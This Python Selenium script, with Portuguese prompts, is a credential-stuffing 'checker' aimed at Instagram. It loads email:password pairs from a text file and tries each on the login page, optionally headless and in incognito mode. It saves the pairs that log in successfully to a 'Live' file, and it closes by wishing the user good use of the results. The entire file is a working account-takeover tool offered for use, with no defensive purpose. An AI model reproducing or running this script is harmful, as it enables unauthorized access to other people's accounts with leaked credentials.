from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import chromedriver_autoinstaller
import time

chromedriver_autoinstaller.install()

db = input("Me passe o caminho do txt: ")
live = input("Me diga o nome Do arquivo das Live: ")
exibir_navegador = int(input("Escolha uma opção:\n1 - Exibir apenas no terminal\n2 - Exibir no terminal e no navegador (modo Analize)\n"))

def ler_credenciais(file_path):
    with open(file_path, 'r') as file:
        lines = file.readlines()
        credentials = [line.strip().split(':') for line in lines]
    return credentials

chrome_options = webdriver.ChromeOptions()

if exibir_navegador == 1:
    chrome_options.add_argument('--incognito')
    chrome_options.add_argument('--headless')

if exibir_navegador == 2:
    chrome_options.add_argument('--incognito')
    driver = webdriver.Chrome(options=chrome_options)
else:
    driver = webdriver.Chrome(options=chrome_options)

driver.get("https://www.instagram.com/")

credenciais = ler_credenciais(db)

for email, senha in credenciais:
    username_input = WebDriverWait(driver, 10).until(EC.visibility_of_element_located((By.XPATH, '//*[@id="loginForm"]/div/div[1]/div/label/input')))
    username_input.clear()
    username_input.send_keys(email)

    password_input = WebDriverWait(driver, 10).until(EC.visibility_of_element_located((By.XPATH, '//*[@id="loginForm"]/div/div[2]/div/label/input')))
    password_input.clear()
    password_input.send_keys(senha)

    login_button = WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, '//*[@id="loginForm"]/div/div[3]/button/div')))
    login_button.click()

    

    time.sleep(3)

    current_url = driver.current_url

    if current_url == "https://www.instagram.com/":
        print(f"Login falhou para {email}: Senha Incorreta")
        try:
            button_notific = WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.CSS_SELECTOR, '<button class="_a9-- _a9_1" tabindex="0">Not Now</button>')))
            button_notific.click()
        except Exception as e:
            pass
    else:
        print(f"Login bem-sucedido para {email} By.DAEMON")
        with open(f'{live}.txt', 'a') as lv:
            lv.write(f'{email}:{senha} Login entrou\n')

    driver.get("https://www.instagram.com/")

print("O CHK rodou e terminou. Faça Bom uso De tudo")

driver.quit()
